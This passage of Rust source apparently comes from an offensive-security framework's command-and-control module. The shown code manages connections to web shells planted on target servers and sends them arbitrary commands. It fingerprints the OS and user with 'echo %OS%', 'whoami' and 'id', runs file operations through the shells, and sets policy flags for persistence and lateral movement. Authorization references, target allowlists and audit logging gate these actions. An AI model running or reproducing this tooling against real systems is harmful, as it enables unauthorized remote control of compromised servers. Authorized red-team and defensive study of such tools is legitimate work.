        os: &str,
        note: &str,
    ) -> Result<WebshellConnection, String> {
        let state = self.store.snapshot().await;
        let host = ensure_target_allowed(&state, url).await?;
        let t = shell_type.trim().to_ascii_lowercase();
        if !matches!(t.as_str(), "php" | "asp" | "aspx" | "jsp" | "custom") {
            return Err("shell_type must be php, asp, aspx, jsp or custom".into());
        }
        let m = method.trim().to_ascii_uppercase();
        if m != "GET" && m != "POST" {
            return Err("method must be GET or POST".into());
        }
        let conn = WebshellConnection {
            id: new_id("ws"),
            name: if name.trim().is_empty() {
                host.clone()
            } else {
                name.trim().to_string()
            },
            url: url.trim().to_string(),
            password: password.to_string(),
            shell_type: t,
            method: m,
            cmd_param: if cmd_param.trim().is_empty() {
                "cmd".into()
            } else {
                cmd_param.trim().to_string()
            },
            pass_param: if pass_param.trim().is_empty() {
                "pass".into()
            } else {
                pass_param.trim().to_string()
            },
            encoding: if encoding.trim().is_empty() {
                "auto".into()
            } else {
                encoding.trim().to_ascii_lowercase()
            },
            os: if os.trim().is_empty() {
                "auto".into()
            } else {
                os.trim().to_ascii_lowercase()
            },
            note: note.to_string(),
            created_at: now_ms(),
            last_seen: None,
        };
        let c = conn.clone();
        self.store
            .mutate(|s| {
                s.webshells.push(conn);
                push_event(
                    s,
                    "info",
                    "webshell",
                    format!("WebShell '{}' saved ({})", c.name, c.url),
                    json!({"id": c.id, "host": host}),
                );
            })
            .await;
        self.store
            .audit("webshell.add", json!({"id": c.id, "url": c.url, "type": c.shell_type}));
        Ok(c)
    }

    pub async fn update_webshell(
        &self,
        id: &str,
        patch: &Value,
    ) -> Result<WebshellConnection, String> {
        let state = self.store.snapshot().await;
        let existing = state
            .webshells
            .iter()
            .find(|w| w.id == id)
            .cloned()
            .ok_or_else(|| "webshell connection not found".to_string())?;
        let mut conn = existing;
        if let Some(v) = patch.get("name").and_then(|v| v.as_str()) {
            conn.name = v.to_string();
        }
        if let Some(v) = patch.get("url").and_then(|v| v.as_str()) {
            ensure_target_allowed(&state, v).await?;
            conn.url = v.to_string();
        }
        if let Some(v) = patch.get("password").and_then(|v| v.as_str()) {
            if !v.is_empty() {
                conn.password = v.to_string();
            }
        }
        if let Some(v) = patch.get("shell_type").and_then(|v| v.as_str()) {
            conn.shell_type = v.to_ascii_lowercase();
        }
        if let Some(v) = patch.get("method").and_then(|v| v.as_str()) {
            conn.method = v.to_ascii_uppercase();
        }
        if let Some(v) = patch.get("cmd_param").and_then(|v| v.as_str()) {
            if !v.is_empty() {
                conn.cmd_param = v.to_string();
            }
        }
        if let Some(v) = patch.get("pass_param").and_then(|v| v.as_str()) {
            if !v.is_empty() {
                conn.pass_param = v.to_string();
            }
        }
        if let Some(v) = patch.get("encoding").and_then(|v| v.as_str()) {
            conn.encoding = v.to_string();
        }
        if let Some(v) = patch.get("os").and_then(|v| v.as_str()) {
            conn.os = v.to_string();
        }
        if let Some(v) = patch.get("note").and_then(|v| v.as_str()) {
            conn.note = v.to_string();
        }
        let c = conn.clone();
        self.store
            .mutate(|s| {
                if let Some(slot) = s.webshells.iter_mut().find(|w| w.id == id) {
                    *slot = c.clone();
                }
            })
            .await;
        self.store.audit("webshell.update", json!({"id": id}));
        Ok(conn)
    }

    pub async fn delete_webshell(&self, id: &str) -> Result<(), String> {
        let found = self
            .store
            .mutate(|s| {
                let before = s.webshells.len();
                s.webshells.retain(|w| w.id != id);
                before != s.webshells.len()
            })
            .await;
        if !found {
            return Err("webshell connection not found".into());
        }
        self.store.audit("webshell.delete", json!({"id": id}));
        Ok(())
    }

    pub async fn webshell(&self, id: &str) -> Option<WebshellConnection> {
        self.store
            .snapshot()
            .await
            .webshells
            .into_iter()
            .find(|w| w.id == id)
    }

    async fn webshell_request(
        &self,
        conn: &WebshellConnection,
        command: &str,
    ) -> Result<(String, u16), String> {
        let state = self.store.snapshot().await;
        ensure_target_allowed(&state, &conn.url).await?;
        let user_agent = "Mozilla/5.0 (compatible; NeuroSploit-WebShell/1.0)";
        let resp = if conn.method == "GET" {
            let mut u = reqwest::Url::parse(&conn.url).map_err(|e| e.to_string())?;
            {
                let mut qp = u.query_pairs_mut();
                qp.append_pair(&conn.pass_param, &conn.password);
                qp.append_pair(&conn.cmd_param, command);
            }
            self.http
                .get(u)
                .header("User-Agent", user_agent)
                .send()
                .await
        } else {
            let body = format!(
                "{}={}&{}={}",
                percent_encode(&conn.pass_param),
                percent_encode(&conn.password),
                percent_encode(&conn.cmd_param),
                percent_encode(command)
            );
            self.http
                .post(&conn.url)
                .header("User-Agent", user_agent)
                .header("Content-Type", "application/x-www-form-urlencoded")
                .body(body)
                .send()
                .await
        }
        .map_err(|e| format!("request failed: {e}"))?;
        let status = resp.status().as_u16();
        let bytes = resp
            .bytes()
            .await
            .map_err(|e| format!("read response: {e}"))?;
        let text = crate::limits::clip(
            &String::from_utf8_lossy(&bytes),
            crate::limits::env_cap("NEUROSPLOIT_C2_OUTPUT_CAP", OUTPUT_CAP),
        );
        self.store.audit(
            "webshell.exec",
            json!({"id": conn.id, "command": command, "http_status": status, "authorization": state.policy.authorized_by}),
        );
        Ok((text, status))
    }

    pub async fn webshell_exec(&self, id: &str, command: &str) -> Result<Value, String> {
        let conn = self
            .webshell(id)
            .await
            .ok_or_else(|| "webshell connection not found".to_string())?;
        if command.trim().is_empty() {
            return Err("command is required".into());
        }
        let (output, status) = self.webshell_request(&conn, command).await?;
        self.store
            .mutate(|s| {
                if let Some(w) = s.webshells.iter_mut().find(|w| w.id == id) {
                    w.last_seen = Some(now_ms());
                }
            })
            .await;
        Ok(json!({
            "ok": status >= 200 && status < 400,
            "connection_id": id,
            "http_status": status,
            "output": output,
        }))
    }

    pub async fn webshell_test(&self, id: &str) -> Result<Value, String> {
        let conn = self
            .webshell(id)
            .await
            .ok_or_else(|| "webshell connection not found".to_string())?;
        let (probe, status) = self.webshell_request(&conn, "echo %OS%").await?;
        let os_guess = if probe.to_ascii_lowercase().contains("windows") {
            "windows"
        } else {
            "linux"
        };
        let (whoami, _) = self
            .webshell_request(
                &conn,
                if os_guess == "windows" {
                    "whoami"
                } else {
                    "id 2>/dev/null || whoami"
                },
            )
            .await
            .unwrap_or_default();
        self.store
            .mutate(|s| {
                if let Some(w) = s.webshells.iter_mut().find(|w| w.id == id) {
                    w.last_seen = Some(now_ms());
                    if w.os.eq_ignore_ascii_case("auto") || w.os.is_empty() {
                        w.os = os_guess.to_string();
                    }
                }
            })
            .await;
        Ok(json!({
            "ok": status >= 200 && status < 400,
            "http_status": status,
            "detected_os": os_guess,
            "output": whoami.trim(),
        }))
    }

    pub async fn webshell_file(
        &self,
        id: &str,
        action: &str,
        path: &str,
        content: Option<&str>,
        target_path: Option<&str>,
    ) -> Result<Value, String> {
        let conn = self
            .webshell(id)
            .await
            .ok_or_else(|| "webshell connection not found".to_string())?;
        let os = if conn.os.eq_ignore_ascii_case("auto") || conn.os.is_empty() {
            let (probe, _) = self
                .webshell_request(&conn, "echo %OS%")
                .await
                .unwrap_or_default();
            if probe.to_ascii_lowercase().contains("windows") {
                "windows"
            } else {
                "linux"
            }
        } else {
            conn.os.as_str()
        };
        let command = build_file_command(
            action,
            path,
            target_path.unwrap_or(""),
            content.unwrap_or(""),
            os,
        )?;
        let (output, status) = self.webshell_request(&conn, &command).await?;
        self.store
            .mutate(|s| {
                if let Some(w) = s.webshells.iter_mut().find(|w| w.id == id) {
                    w.last_seen = Some(now_ms());
                }
            })
            .await;
        self.store.audit(
            "webshell.file",
            json!({"id": id, "action": action, "path": path, "os": os}),
        );
        Ok(json!({
            "ok": status >= 200 && status < 400,
            "connection_id": id,
            "action": action,
            "http_status": status,
            "output": output,
        }))
    }

    // -- policy ------------------------------------------------------------

    pub async fn enable_policy(
        &self,
        authorization: &str,
        persistence: bool,
        lateral: bool,
        allow_public: bool,
        hosts: &[String],
    ) -> Result<C2Policy, String> {
        if authorization.trim().is_empty() {
            return Err(
                "authorization reference is required to enable C2 (SOW, ticket, or bug-bounty URL)"
                    .into(),
            );
        }
        let policy = self
            .store
            .mutate(|s| {
                s.policy.enabled = true;
                s.policy.authorized_by = authorization.trim().to_string();
                s.policy.allow_persistence = persistence;
                s.policy.allow_lateral = lateral;
                if allow_public {
                    s.policy.allow_public_targets = true;
                }
                s.policy.internal_only = !allow_public;
                for h in hosts {
                    let h = h.trim();
                    if !h.is_empty() && !s.policy.allowed_hosts.iter().any(|x| x == h) {
                        s.policy.allowed_hosts.push(h.to_string());
                    }
                }
                push_event(
                    s,
                    "warn",
                    "policy",
                    format!(
                        "C2 enabled by {}{}{}",
                        authorization.trim(),
                        if persistence { " · persistence allowed" } else { "" },
                        if lateral { " · lateral allowed" } else { "" }
                    ),
                    json!({"persistence": persistence, "lateral": lateral, "allow_public": allow_public}),
                );
                s.policy.clone()
            })
            .await;
        self.store.audit(
            "policy.enable",
            json!({"authorization": authorization.trim(), "persistence": persistence, "lateral": lateral, "allow_public": allow_public}),
        );
        Ok(policy)
    }

    pub async fn disable(&self) -> C2Policy {
        let ids: Vec<String> = self
            .store
            .snapshot()
            .await
            .listeners
            .iter()
            .map(|l| l.id.clone())
            .collect();
        for id in ids {
            let _ = self.stop_listener(&id).await;
        }
        let policy = self
            .store
            .mutate(|s| {
                s.policy.enabled = false;
                push_event(s, "warn", "policy", "C2 disabled — listeners stopped", json!({}));
                s.policy.clone()
            })
            .await;
        self.store.audit("policy.disable", json!({}));
        policy
    }

    pub async fn set_policy(&self, patch: &Value) -> Result<C2Policy, String> {
        let policy = self
            .store
            .mutate(|s| {
                if let Some(v) = patch.get("authorized_by").and_then(|v| v.as_str()) {
                    s.policy.authorized_by = v.to_string();
                }
                if let Some(v) = patch.get("internal_only").and_then(|v| v.as_bool()) {
                    s.policy.internal_only = v;
                }
                if let Some(v) = patch.get("allow_persistence").and_then(|v| v.as_bool()) {
                    s.policy.allow_persistence = v;
                }
                if let Some(v) = patch.get("allow_lateral").and_then(|v| v.as_bool()) {
                    s.policy.allow_lateral = v;
                }
                if let Some(v) = patch.get("allow_public_targets").and_then(|v| v.as_bool()) {
                    s.policy.allow_public_targets = v;
                }
                if let Some(arr) = patch.get("allowed_hosts").and_then(|v| v.as_array()) {
                    s.policy.allowed_hosts = arr
                        .iter()
                        .filter_map(|v| v.as_str())
                        .map(|v| v.trim().to_string())
                        .filter(|v| !v.is_empty())
                        .collect();
                }
                if let Some(arr) = patch.get("command_deny_regex").and_then(|v| v.as_array()) {
                    s.policy.command_deny_regex = arr
                        .iter()
                        .filter_map(|v| v.as_str())
                        .map(|v| v.to_string())
                        .collect();
                }
                if let Some(v) = patch.get("max_sessions").and_then(|v| v.as_u64()) {
                    s.policy.max_sessions = (v as usize).clamp(1, 10_000);
                }
                s.policy.clone()
            })
            .await;
        self.store.audit("policy.update", json!({"policy": policy}));
        Ok(policy)
    }
}
